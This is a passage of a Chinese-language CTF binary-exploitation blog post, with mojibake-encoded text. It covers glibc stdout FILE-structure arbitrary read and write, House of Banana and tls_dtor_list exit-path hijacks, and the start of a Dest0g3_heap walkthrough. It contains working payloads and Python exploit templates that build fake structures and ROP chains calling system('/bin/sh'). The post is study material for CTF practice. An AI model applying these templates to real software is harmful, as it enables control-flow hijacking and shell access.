class="hljs-comment">//å¦‚æœè¾“å‡ºç¼“å†²åŒºæœ‰ç©ºé—´ï¼Œåˆ™å…ˆæŠŠæ•°æ®æ‹·è´è‡³è¾“å‡ºç¼“å†²åŒº</span><br>      <span class="hljs-keyword">if</span> (count &gt; to_do)<br>    count = to_do;<br>      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);<br>      s += count;<br>      to_do -= count;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (to_do + must_flush &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">//æ­¤å¤„å…³é”®ï¼Œè§ä¸‹æ–‡è¯¦ç»†è®¨è®º</span><br>    &#123;<br>      _IO_size_t block_size, do_write;<br>      <span class="hljs-keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF) <span class="hljs-comment">//è°ƒç”¨_IO_OVERFLOW</span><br>        <span class="hljs-keyword">return</span> to_do == <span class="hljs-number">0</span> ? EOF : n - to_do;<br>      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;<br>      do_write = to_do - (block_size &gt;= <span class="hljs-number">128</span> ? to_do % block_size : <span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">if</span> (do_write)<br>        &#123;<br>          count = new_do_write (f, s, do_write);<br>          to_do -= count;<br>          <span class="hljs-keyword">if</span> (count &lt; do_write)<br>            <span class="hljs-keyword">return</span> n - to_do;<br>        &#125;<br>      <span class="hljs-keyword">if</span> (to_do)<br>        to_do -= _IO_default_xsputn (f, s+do_write, to_do);<br>    &#125;<br>  <span class="hljs-keyword">return</span> n - to_do;<br>&#125;<br>libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)<br></code></pre></td></tr></table></figure><h3 id="ä»»æ„å†™"><a class="header-anchor" href="#ä»»æ„å†™">Â¶</a><strong>ä»»æ„å†™</strong></h3><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è¡Œç¼“å†²æ¨¡å¼ä¸‹ï¼Œåˆ¤æ–­è¾“å‡ºç¼“å†²åŒºè¿˜æœ‰å¤šå°‘ç©ºé—´ï¼Œç”¨çš„æ˜¯<code>count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr</code>ï¼Œè€Œåœ¨å…¨ç¼“å†²æ¨¡å¼ä¸‹ï¼Œç”¨çš„æ˜¯<code>count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr</code>ï¼Œè‹¥æ˜¯è¿˜æœ‰ç©ºé—´å‰©ä½™ï¼Œåˆ™ä¼šå°†è¦è¾“å‡ºçš„æ•°æ®å¤åˆ¶åˆ°è¾“å‡ºç¼“å†²åŒºä¸­ï¼ˆæ­¤æ—¶ç”±<code>_IO_write_ptr</code>æ§åˆ¶ï¼Œå‘<code>_IO_write_ptr</code>æ‹·è´<code>count</code>é•¿åº¦çš„æ•°æ®ï¼‰ï¼Œå› æ­¤å¯é€šè¿‡è¿™ä¸€ç‚¹æ¥å®ç°ä»»æ„åœ°å€å†™çš„åŠŸèƒ½ã€‚<br><strong>åˆ©ç”¨æ–¹å¼</strong>ï¼šä»¥å…¨ç¼“å†²æ¨¡å¼ä¸ºä¾‹ï¼Œåªéœ€å°†<code>_IO_write_ptr</code>æŒ‡å‘<code>write_start</code>ï¼Œ<code>_IO_write_end</code>æŒ‡å‘<code>write_end</code>å³å¯ã€‚<br>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæœ‰å®å®šä¹‰<code>#define _IO_LINE_BUF 0x0200</code>ï¼Œæ­¤å¤„<code>flag &amp; _IO_LINE_BUF</code>ä¸ºçœŸï¼Œåˆ™è¡¨ç¤º<code>flag</code>ä¸­åŒ…å«äº†<code>_IO_LINE_BUF</code>æ ‡è¯†ï¼Œå³å¼€å¯äº†è¡Œç¼“å†²æ¨¡å¼ï¼ˆå¯ç”¨<code>setvbuf(stdout,0,_IOLBF,1024)</code>å¼€å¯ï¼‰ï¼Œè‹¥è¦æ„é€ <code>flag</code>åŒ…å«<code>_IO_LINE_BUF</code>æ ‡è¯†ï¼Œåˆ™<code>flag |= 0x200</code>å³å¯ã€‚</p><h3 id="ä»»æ„è¯»"><a class="header-anchor" href="#ä»»æ„è¯»">Â¶</a><strong>ä»»æ„è¯»</strong></h3><p>å…ˆè®¨è®º<code>_IO_new_file_xsputn</code>æºä»£ç ä¸­<code>if (to_do + must_flush &gt; 0)</code>æœ‰å“ªäº›æƒ…å†µä¼šæ‰§è¡Œè¯¥åˆ†æ”¯ä¸­çš„å†…å®¹ï¼š<br><strong>(a)</strong> é¦–å…ˆè¦æ˜ç¡®çš„æ˜¯<code>to_do</code>ä¸€å®šæ˜¯éè´Ÿæ•°ï¼Œå› æ­¤è‹¥<code>must_flush</code>ä¸º<code>1</code>çš„æ—¶å€™å°±ä¼šæ‰§è¡Œè¯¥åˆ†æ”¯ä¸­çš„å†…å®¹ï¼Œè€Œå†å¾€ä¸Šçœ‹ï¼Œå½“éœ€è¦è¾“å‡ºçš„å†…å®¹ä¸­æœ‰<code>\n</code>æ¢è¡Œç¬¦çš„æ—¶å€™å°±ä¼šéœ€è¦åˆ·æ–°è¾“å‡ºç¼“å†²åŒºï¼Œå³å°†<code>must_flush</code>è®¾ä¸º<code>1</code>ï¼Œæ•…å½“è¾“å‡ºå†…å®¹ä¸­æœ‰<code>\n</code>çš„æ—¶å€™å°±ä¼šæ‰§è¡Œè¯¥åˆ†æ”¯çš„å†…å®¹ï¼Œå¦‚ç”¨<code>puts</code>å‡½æ•°è¾“å‡ºå°±ä¸€å®šä¼šæ‰§è¡Œã€‚<br><strong>(b)</strong> è‹¥<code>to_do</code>å¤§äº<code>0</code>ï¼Œä¹Ÿä¼šæ‰§è¡Œè¯¥åˆ†æ”¯ä¸­çš„å†…å®¹ï¼Œå› æ­¤ï¼Œå½“ è¾“å‡ºç¼“å†²åŒºæœªå»ºç«‹ æˆ–è€… è¾“å‡ºç¼“å†²åŒºæ²¡æœ‰å‰©ä½™ç©ºé—´ æˆ–è€… è¾“å‡ºç¼“å†²åŒºå‰©ä½™çš„ç©ºé—´ä¸å¤Ÿä¸€æ¬¡æ€§å°†ç›®æ ‡åœ°å€ä¸­çš„æ•°æ®å®Œå…¨æ‹·è´è¿‡æ¥ çš„æ—¶å€™ï¼Œä¹Ÿä¼šæ‰§è¡Œè¯¥<code>if</code>åˆ†æ”¯ä¸­çš„å†…å®¹ã€‚<br>è€Œè¯¥<code>if</code>åˆ†æ”¯ä¸­ä¸»è¦è°ƒç”¨äº†<code>_IO_OVERFLOW()</code>æ¥åˆ·æ–°è¾“å‡ºç¼“å†²åŒºï¼Œè€Œåœ¨æ­¤è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨<code>_IO_do_write()</code>è¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„æ•°æ®ã€‚</p><p>ç›¸å…³æºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> _IO_new_file_overflow (_IO_FILE *f, <span class="hljs-type">int</span> ch)<br>&#123;<br>  <span class="hljs-comment">// åˆ¤æ–­æ ‡å¿—ä½æ˜¯å¦åŒ…å«_IO_NO_WRITES =&gt; _flagséœ€è¦ä¸åŒ…å«_IO_NO_WRITES</span><br>  <span class="hljs-keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES)<br>    &#123;<br>      f-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-comment">// åˆ¤æ–­è¾“å‡ºç¼“å†²åŒºæ˜¯å¦ä¸ºç©º ä»¥åŠ æ˜¯å¦ä¸åŒ…å«_IO_CURRENTLY_PUTTINGæ ‡å¿—ä½</span><br>  <span class="hljs-comment">// ä¸ºäº†ä¸æ‰§è¡Œè¯¥ifåˆ†æ”¯ä»¥å…å‡ºé”™ï¼Œæœ€å¥½å®šä¹‰ _flags åŒ…å« _IO_CURRENTLY_PUTTING</span><br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="hljs-number">0</span> || f-&gt;_IO_write_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      ...<br>    &#125;<br>  <span class="hljs-comment">// è°ƒç”¨_IO_do_write è¾“å‡º è¾“å‡ºç¼“å†²åŒº</span><br>  <span class="hljs-comment">// ä»_IO_write_baseå¼€å§‹ï¼Œè¾“å‡º(_IO_write_ptr - f-&gt;_IO_write_base)ä¸ªå­—èŠ‚çš„æ•°æ®</span><br>  <span class="hljs-keyword">if</span> (ch == EOF)<br>    <span class="hljs-keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,<br>             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>) ch;<br>&#125;<br>libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> _IO_size_t <span class="hljs-title function_">new_do_write</span> <span class="hljs-params">(_IO_FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *data, _IO_size_t to_do)</span><br>&#123;<br>  ...<br>  _IO_size_t count;<br>  <span class="hljs-comment">// ä¸ºäº†ä¸æ‰§è¡Œelse ifåˆ†æ”¯ä¸­çš„å†…å®¹ä»¥äº§ç”Ÿé”™è¯¯ï¼Œå¯æ„é€ _flagsåŒ…å«_IO_IS_APPENDING æˆ– è®¾ç½®_IO_read_endç­‰äº_IO_write_base</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)<br>    fp-&gt;_offset = _IO_pos_BAD;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)<br>    &#123;<br>      _IO_off64_t new_pos<br>    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> (new_pos == _IO_pos_BAD)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      fp-&gt;_offset = new_pos;<br>    &#125;<br>  <span class="hljs-comment">// è°ƒç”¨å‡½æ•°è¾“å‡ºè¾“å‡ºç¼“å†²åŒº</span><br>  count = _IO_SYSWRITE (fp, data, to_do);<br>  ...<br>  <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»¼ä¸Šï¼Œä¸ºäº†åšåˆ°<strong>ä»»æ„è¯»</strong>ï¼Œæ»¡è¶³å¦‚ä¸‹æ¡ä»¶ï¼Œå³å¯è¿›è¡Œåˆ©ç”¨ï¼š<br>(1) è®¾ç½®<code>_flag &amp;~ _IO_NO_WRITES</code>ï¼Œå³<code>_flag &amp;~ 0x8</code>ï¼›<br>(2) è®¾ç½®<code>_flag &amp; _IO_CURRENTLY_PUTTING</code>ï¼Œå³<code>_flag | 0x800</code>ï¼›<br>(3) è®¾ç½®<code>_fileno</code>ä¸º<code>1</code>ï¼›<br>(4) è®¾ç½®<code>_IO_write_base</code>æŒ‡å‘æƒ³è¦æ³„éœ²çš„åœ°æ–¹ï¼Œ<code>_IO_write_ptr</code>æŒ‡å‘æ³„éœ²ç»“æŸçš„åœ°å€ï¼›<br>(5) è®¾ç½®<code>_IO_read_end</code>ç­‰äº<code>_IO_write_base</code> æˆ– è®¾ç½®<code>_flag &amp; _IO_IS_APPENDING</code>å³ï¼Œ<code>_flag | 0x1000</code>ã€‚<br>æ­¤å¤–ï¼Œæœ‰ä¸€ä¸ªå¤§å‰æï¼šéœ€è¦è°ƒç”¨<code>_IO_OVERFLOW()</code>æ‰è¡Œï¼Œå› æ­¤éœ€ä½¿å¾—éœ€è¦è¾“å‡ºçš„å†…å®¹ä¸­å«æœ‰<code>\n</code>æ¢è¡Œç¬¦ æˆ– è®¾ç½®<code>_IO_write_end</code>ç­‰äº<code>_IO_write_ptr</code>ï¼ˆè¾“å‡ºç¼“å†²åŒºæ— å‰©ä½™ç©ºé—´ï¼‰ç­‰ã€‚<br>ä¸€èˆ¬æ¥è¯´ï¼Œç»å¸¸åˆ©ç”¨<code>puts</code>å‡½æ•°åŠ ä¸Šè¿°<code>stdout</code>ä»»æ„è¯»çš„æ–¹å¼æ³„éœ²<code>libc</code>ã€‚<br><code>_flag</code>çš„æ„é€ éœ€æ»¡è¶³çš„æ¡ä»¶:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">_flags = <span class="hljs-number">0xfbad0000</span> <br>_flags &amp; = ~_IO_NO_WRITES <span class="hljs-comment">// _flags = 0xfbad0000</span><br>_flags | = _IO_CURRENTLY_PUTTING <span class="hljs-comment">// _flags = 0xfbad0800</span><br>_flags | = _IO_IS_APPENDING <span class="hljs-comment">// _flags = 0xfbad1800</span><br></code></pre></td></tr></table></figure><p>å› æ­¤ï¼Œä¾‹å¦‚åœ¨<code>libc-2.27</code>ä¸‹ï¼Œæ„é€ <code>payload = p64(0xfbad1800) + p64(0)*3 + b'\x58'</code>ï¼Œæ³„éœ²å‡ºçš„ç¬¬ä¸€ä¸ªåœ°å€å³ä¸º<code>_IO_file_jumps</code>çš„åœ°å€ã€‚<br>æ­¤å¤–ï¼Œ<code>_flags</code>ä¹Ÿå¯å†åŠ ä¸€äº›å…¶ä»–æ— å…³ç´§è¦çš„éƒ¨åˆ†ï¼Œå¦‚è®¾ç½®ä¸º<code>0xfbad1887</code>ï¼Œ<code>0xfbad1880</code>ï¼Œ<code>0xfbad3887</code>ç­‰ç­‰ã€‚</p><h1>[ç•ªå¤–ç¯‡]Exit è‰ºæœ¯é‰´èµ</h1><p>ğŸ‘´ ä¸æƒ³å¼€æ–°çš„æ–‡ç« ï¼Œä½•å†µ exit å’Œ IO åœ¨æŸäº›åœºåˆè”ç³»æ¯”è¾ƒç´§ã€‚</p><p>ä¸‹é¢æ‰€æœ‰åˆ©ç”¨æ‰‹æ³•çš„æ¡ä»¶ç›¸å¯¹ç»Ÿä¸€ã€‚</p><ol><li>èƒ½ä»ä¸»å‡½æ•°è¿”å›æˆ–è¿›å…¥ exit</li><li>ä¸€æ¬¡ Largebin Attack æˆ–ä»»æ„å†™ï¼ˆlibc åœ°å€å’Œ heap åœ°å€è¦æœ‰ï¼‰</li></ol><h2 id="Hosue-of-Banana"><a class="header-anchor" href="#Hosue-of-Banana">Â¶</a>Hosue of Banana</h2><p>è¿™ç©æ„å•è°ˆåˆ©ç”¨ä¸éš¾ï¼Œç»“æ„ä½“ ğŸ‘´ è¯´å®è¯çœ‹çš„ä¼¼æ‡‚éæ‡‚ï¼Œä½†æ˜¯ ğŸ‘´ ä¸€è°ƒè¯•å°±çŸ¥é“å“ªé‡Œå¯ä»¥æ‰“éªšæ“ä½œï¼Œåªè¦åŠ«æŒæ‰ç›¸å…³æŒ‡é’ˆå°±å¥½äº†ã€‚è°ƒè¯•æ²¡å†™å°±æ˜¯è¿˜åœ¨å’•ã€‚</p><p>æ‹¿ä¸‹é¢æ¨¡æ¿çš„è¯è®°å¾—è‡ªå·±æ”¹æ”¹ï¼Œä¸ç„¶å’±wpæ’äº†è›®å°´å°¬ = =</p><h3 id="æ€è·¯-v4"><a class="header-anchor" href="#æ€è·¯-v4">Â¶</a>æ€è·¯</h3><p>å°±ç®—ä½ ç°åœ¨æ²¡æ—¶é—´å»è°ƒè¯•ï¼Œæ‹¿ä¸‹é¢çš„æ¨¡æ¿ï¼ŒæŒ‰è¿™ä¸ªæ­¥éª¤å°±èƒ½å®Œæˆæ ˆè¿ç§»ï¼š</p><ol><li>Largebin Attack æ‰“ <code>_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next</code>ã€‚</li><li>ä¸‹é¢çš„ link_4_addr æ”¹æˆ Largebin(Chunk2) çš„ <strong>chunkå¤´</strong> åœ°å€</li><li>åˆ©ç”¨ Chunk1 åœ¨ Chunk2 çš„ prev_data ä½ç½®å†™ä¸Š p64(link_4_addr + 0x20)</li><li>èµ° exit è§¦å‘ SROP å®Œæˆæ ˆè¿ç§»ï¼Œæˆ–è€…æ”¹æ‰ä¸‹é¢æ ‡æ³¨çš„ RIP ï¼Œèµ°è‡ªå·±çš„å¥‡å¥‡æ€ªæ€ª</li></ol><h3 id="SROP-æ ˆè¿ç§»"><a class="header-anchor" href="#SROP-æ ˆè¿ç§»">Â¶</a>SROP æ ˆè¿ç§»</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">rop_chain = flat(pop_rdi_ret,bin_sh,ret,system_addr)<br>link_4_addr = heap_base + <span class="hljs-number">0xcd0</span><br>fake_link_map = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(link_4_addr)<br>fake_link_map += p64(magic) + p64(ret)<span class="hljs-comment"># magic = setcontext+61</span><br>fake_link_map += p64(<span class="hljs-number">0</span>)<br>fake_link_map += rop_chain<br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0xc8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_link_map += p64(link_4_addr + <span class="hljs-number">0x28</span> + <span class="hljs-number">0x18</span>) <span class="hljs-comment"># RSP</span><br>fake_link_map += p64(pop_rdi_ret)   <span class="hljs-comment"># RCX RIP</span><br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_link_map += p64(link_4_addr + <span class="hljs-number">0x10</span> + <span class="hljs-number">0x110</span>)*<span class="hljs-number">0x3</span><br>fake_link_map += p64(<span class="hljs-number">0x10</span>)  <br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0x31C</span> - <span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_link_map += p8(<span class="hljs-number">0x8</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x520</span>+p64(link_4_addr + <span class="hljs-number">0x20</span>))<br>edit(<span class="hljs-number">2</span>,fake_link_map)<br></code></pre></td></tr></table></figure><h2 id="tls-dtor-list"><a class="header-anchor" href="#tls-dtor-list">Â¶</a>tls_dtor_list</h2><p>ğŸ‘´ ä¹ŸçŸ¥é“è¿™ç©æ„ä¹Ÿä¸æ˜¯ IOï¼Œä½†ä¹Ÿæ‰”è¿™ã€‚</p><h3 id="æ¡ä»¶"><a class="header-anchor" href="#æ¡ä»¶">Â¶</a>æ¡ä»¶</h3><ol><li>èƒ½ä»ä¸»å‡½æ•°è¿”å›æˆ–è¿›å…¥ exit</li><li>ä¿©æ¬¡ Largebin Attack æˆ–ä»»æ„å†™ï¼ˆlibc åœ°å€å’Œ heap åœ°å€è¦æœ‰ï¼‰ï¼Œä¸€æ¬¡å†™ fskeyï¼Œä¸€æ¬¡å†™ tls_dtor_list æŒ‡é’ˆ</li></ol><h3 id="æºç "><a class="header-anchor" href="#æºç ">Â¶</a>æºç </h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// glibc-2.35/stdlib/cxa_thread_atexit_impl.c</span><br><span class="hljs-comment">/* Call the destructors.  This is called either when a thread returns from the</span><br><span class="hljs-comment">   initial function or when the process exits via the exit function.  */</span><br><span class="hljs-type">void</span><br>__call_tls_dtors (<span class="hljs-type">void</span>)<br>&#123;<br>  <span class="hljs-keyword">while</span> (tls_dtor_list)<br>    &#123;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dtor_list</span> *<span class="hljs-title">cur</span> =</span> tls_dtor_list;<br>      dtor_func func = cur-&gt;func;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>      PTR_DEMANGLE (func);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>      tls_dtor_list = tls_dtor_list-&gt;next;<br>      func (cur-&gt;obj);<br><br>      <span class="hljs-comment">/* Ensure that the MAP dereference happens before</span><br><span class="hljs-comment"> l_tls_dtor_count decrement.  That way, we protect this access from a</span><br><span class="hljs-comment"> potential DSO unload in _dl_close_worker, which happens when</span><br><span class="hljs-comment"> l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span><br>      atomic_fetch_add_release (&amp;cur-&gt;<span class="hljs-built_in">map</span>-&gt;l_tls_dtor_count, <span class="hljs-number">-1</span>);<br>      <span class="hljs-built_in">free</span> (cur);<br>    &#125;<br>&#125;<br>libc_hidden_def (__call_tls_dtors)<br></code></pre></td></tr></table></figure><h3 id="è°ƒè¯•-v4"><a class="header-anchor" href="#è°ƒè¯•-v4">Â¶</a>è°ƒè¯•</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; b __call_tls_dtors<br>Breakpoint <span class="hljs-number">1</span> at <span class="hljs-number">0x7ffff7dd1d60</span>: file ./stdlib/cxa_thread_atexit_impl.c, line <span class="hljs-number">149.</span><br></code></pre></td></tr></table></figure><p>ä¸€æ¬¡æ‰“ fskeyï¼Œé€šè¿‡ canary æˆ–è€… fsbase å¯»å€ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220721205843557.png" alt="image-20220721205843557"></p><p>ä¸€æ¬¡æ‰“ tls_dtor_listã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220721205926990.png" alt="image-20220721205926990"></p><p>åœ¨æµç¨‹ä¸­ä¼šä» Largebin çš„ prev_data ä½ç½®æ‹¿ rax ï¼Œbk ä½ç½®æ‹¿ rdxã€‚ï¼ˆsizeä½ç½®æ‹¿ rdiï¼‰</p><p>è€ƒè™‘ï¼š</p><ol><li>ç®€å•çš„é€šè¿‡å‰ä¸€å †å—å†™ prev_dataï¼ŒLargebin å†™ bkï¼Œåˆ©ç”¨ setcontext + 61 èµ° SROP</li><li>æ¢å¤ Largebinï¼Œç”³è¯·å‡ºä¸åŒ size çš„ï¼Œå†™ system å’Œ <code>/bin/sh</code> åˆ†åˆ«åœ¨ä¿©ä½ç½® getshell</li></ol><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220721210027171.png" alt="image-20220721210027171"></p><p>å®Œæˆæ§åˆ¶æµåŠ«æŒã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220721210316505.png" alt="image-20220721210316505"></p><h3 id="SROP-æ ˆè¿ç§»-v2"><a class="header-anchor" href="#SROP-æ ˆè¿ç§»-v2">Â¶</a>SROP æ ˆè¿ç§»</h3><p>å¸ƒå±€ï¼š</p><ol><li>Chunk1 æ˜¯ç”¨æ¥è¦†å†™ Chunk2 çš„ prev_data éƒ¨åˆ†</li><li>Chunk2 æ˜¯ç”¨æ¥ Largebin Attack çš„ Largebin</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x520</span>+p64(rol(magic^(fskey),<span class="hljs-number">0x11</span>,<span class="hljs-number">64</span>)))<br>edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">1</span>+p64(heap_base+<span class="hljs-number">0xcd0</span>))<br></code></pre></td></tr></table></figure><h1>ç»å…¸ä¾‹é¢˜é‰´èµ</h1><h2 id="Dest0g3-heap"><a class="header-anchor" href="#Dest0g3-heap">Â¶</a>Dest0g3_heap</h2><p>è¿™é¢˜ ğŸ‘´ è‚¯å®šåšéº»çƒ¦äº†ï¼Œä½†æ˜¯ ğŸ‘´ æ‰“çš„å¾ˆçˆ½ã€‚</p><p>å‡ºè‡ª BUUCTF çš„ <a href="https://buuoj.cn/match/matches/109/challenges#ez_kiwi">Dest0g3 520è¿æ–°èµ›</a>ã€‚è¿™é¢˜å¦‚æœæ”¾åˆ° 2.34 ä¸”å¼€æ²™ç®±ï¼Œå°†æ˜¯ç»æ€ï¼ŒğŸ‘´ ä¾¿æ„¿ç§°ä¹‹ä¸º <strong>IO ä¸“é¡¹è®­ç»ƒ</strong>ã€‚å¯æƒœæ”¾ä¸å¾—ã€‚</p><p>ä½†æ˜¯ ğŸ‘´ è¿™é‡Œè¿˜æ˜¯è‡ªå·±åˆ†åˆ«å‡è£…æ‰“ä¸€ä¸‹æ²¡æœ‰å¼€äº†æ²™ç®±çš„æƒ…å½¢å’Œæ²¡æœ‰ <strong>hook</strong> å¼€äº†æ²™ç®±çš„æƒ…å½¢ï¼Œé—®å°±æ˜¯ ğŸ‘´ ä¸æƒ³è‡ªå·±æ•´ demo äº†ã€‚</p><h3 id="åˆ†æ-v4"><a class="header-anchor" href="#åˆ†æ-v4">Â¶</a>åˆ†æ</h3><p>ç¨‹åºæ¯”è¾ƒæœ‰æ„æ€ï¼Œmmap äº†ä¸€å—ç©ºé—´ï¼Œåœ¨å…¶ä¸Šæˆ‘ä»¬å¯ä»¥ä»»æ„ edit å’Œ free ã€‚ä½†æ˜¯ç»™æˆ‘ä»¬çš„ add æ˜¯ calloc ä¸€ä¸ªå †å—ï¼Œå¯¹æˆ‘ä»¬å½±å“å¾ˆå¤§ã€‚ ç„¶åç»™çš„ show ä¹Ÿæ˜¯ show å’± calloc çš„å †å—ï¼Œæ‰€ä»¥æœ‰ç‚¹é˜´é—´ã€‚</p><h4 id="Init"><a class="header-anchor" href="#Init">Â¶</a>Init</h4><p><strong>setvbuf</strong> ğŸ‘´ ä¹Ÿè§å¾—å¤šäº†ï¼Œè¿™ âœ”ï¸ 8ï¸âƒ£ ç©æ„ç”¨åœ¨ stdin å’Œ stdout ç‰¹åˆ«åˆé€‚ï¼Œå¯ä»¥è§£å†³è¿œç«¯äº¤äº’çš„é—®é¢˜ã€‚ä½†æ˜¯å®ƒä¼šæŠŠæŒ‡é’ˆæ”¾åˆ° bss æ®µä¸Šï¼Œç”¨åœ¨ <strong>stderr</strong> ä¼šè®© ğŸ‘´ ğŸ‘ <strong>Emma</strong> çš„éš¾åº¦å¢åŠ ã€‚è¿™å‡½æ•°å°±æ˜¯ mmap äº†ä¸€å—å¯è¯»å¯å†™çš„åŒºåŸŸï¼Œç”¨ä½œæˆ‘ä»¬è‡ªå·±çš„å †ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_121A</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  __int64 buf; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span 